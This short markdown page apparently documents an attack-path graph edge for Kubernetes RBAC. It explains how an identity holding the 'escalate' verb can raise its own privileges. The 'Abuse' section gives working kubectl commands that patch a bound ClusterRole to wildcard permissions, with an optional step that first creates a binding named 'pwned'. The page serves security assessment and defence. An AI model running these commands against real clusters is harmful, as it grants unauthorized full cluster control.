# CH_canEscalate

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Namespace](../NodeDescriptions/CH_Namespace.md) / [CH_Cluster](../NodeDescriptions/CH_Cluster.md)

## General Information

The Identity holds the `escalate` verb on Roles or ClusterRoles, allowing creation or update of roles with permissions exceeding its own. Points to the Namespace for Role permissions, Cluster for ClusterRole permissions.

## Abuse

The `escalate` verb bypasses Kubernetes's restriction on creating or updating Roles and ClusterRoles with permissions you don't already hold. It does not bypass the binding check. You still cannot bind a role whose permissions exceed your own unless you already have a binding to it or hold the `bind` verb on it specifically.

The primary path is patching a role the identity is already bound to. No new binding is needed, because the existing binding covers whatever permissions the role gains. Check all RoleBindings and ClusterRoleBindings for the current identity to find a modifiable role.

If no existing binding is exploitable, `CH_canBind` on the same identity unlocks an alternative: create a binding to any low-privilege role first (the binding check passes while the role is still within your permission set), then patch that role to wildcard.

```bash
# Patch an existing role you are already bound to, escalating it to wildcard
kubectl patch clusterrole <bound-role> --type=json \
  -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'

# Or with canBind: bind to a low-priv role first, then escalate it
kubectl create clusterrolebinding pwned \
  --clusterrole=<low-priv-role> \
  --serviceaccount=<namespace>:<serviceaccount>

kubectl patch clusterrole <low-priv-role> --type=json \
  -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'
```

## References

- [Kubernetes RBAC escalate verb](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-creation-or-update)
- [HackTricks - Abusing Roles/ClusterRoles in Kubernetes](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)